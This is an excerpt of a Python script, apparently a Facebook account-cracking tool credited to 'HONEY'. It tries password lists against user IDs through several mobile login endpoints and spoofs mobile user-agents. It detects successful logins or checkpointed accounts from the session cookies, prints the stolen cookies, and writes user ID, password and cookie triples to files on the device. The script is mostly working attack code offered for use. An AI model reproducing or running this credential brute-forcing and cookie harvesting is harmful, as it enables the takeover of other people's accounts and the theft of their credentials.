#created by HONEY aka Aryan chaudhary
#open source by HONEY
#github= HONEY-XD
...
def uaku2():
	try:
		...
		a=requests.get('https://github.com/HONEY-XD/XD/blob/main/ua2.txt').text
		ua=open('.ua2.txt','w')
...
def mbasic(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[1;92m[HONEY-OK] '+cid+' | '+ps+'\33[0;97m')
				if 'y' in HONEY_xd:
				...
				cid = coki[141:156]
				if 'y' in baby:
					print('\33[1;91m[HONEY-CP] '+cid+' | '+ps+'\33[0;97m')
					open('/sdcard/HONEY-CP.txt', 'a').write(cid+' | '+ps+'\n')
					cps.append(cid)
					break
				else:
					open('/sdcard/HONEY-CP.txt', 'a').write(cid+' | '+ps+'\n')
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M1-HONEY] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def p(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M2-HONEY] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def mobile(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; POCO F1 Build/QKQ1.190828.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',}
			...
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[151:166]
				print('\r\033[1;32m[HONEY-OK]\033[1;37m'+uid+' | '+ps+'|'+Joined(uid)+'\r\033[1;35m')
				if 'y' in HONEY_xd:
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[151:166]
				print('\33[1;92m[HONEY-OK] '+uid+' | '+ps+'\33[0;97m')
				if 'y' in HONEY_xd:
					print("\33[0;97m[💚] \33[1;98mCOOKIES : \33[0;97m"+coki)
					cek_apk(session,coki)
				else:
					break
				open('/sdcard/HONEY-OK.txt', 'a').write(uid+'|'+ps+'|'+coki+'\n')
				oks.append(uid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				if 'y' in baby:
					print('\33[1;91m[HONEY-CP] '+uid+'|'+ps+'\33[0;97m')
					open('/sdcard/HONEY-CP.txt', 'a').write(uid+' | '+ps+'\n')
					cps.append(uid)
					break
				else:
					open('/sdcard/HONEY-CP.txt', 'a').write(uid+' | '+ps+'\n')
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M6-HONEY] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
